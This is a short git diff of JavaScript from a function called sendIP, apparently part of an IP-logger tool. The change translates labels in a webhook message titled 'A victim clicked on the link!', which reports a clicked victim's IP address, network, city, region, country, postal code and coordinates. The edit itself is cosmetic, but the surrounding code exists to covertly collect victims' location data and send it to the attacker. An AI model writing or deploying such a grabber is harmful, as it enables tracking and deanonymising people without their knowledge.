@@ -19,7 +19,7 @@ const sendIP = () => {
                             embeds: [
                                 {
                                     title: 'A victim clicked on the link!',
-                                    description: `**IP : **${ipadd}\n**Rete : ** ${geoData.network}\n**Città : ** ${geoData.city}\n**Regione : ** ${geoData.region}\n**Paese : ** ${geoData.country_name}\n**Codice Postale : ** ${geoData.postal}\n**Latitudine : ** ${geoData.latitude}\n**Longitudine : ** ${geoData.longitude}`,
+                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                     color: 0x800080 // optionally changeable
                                 }
                             ]
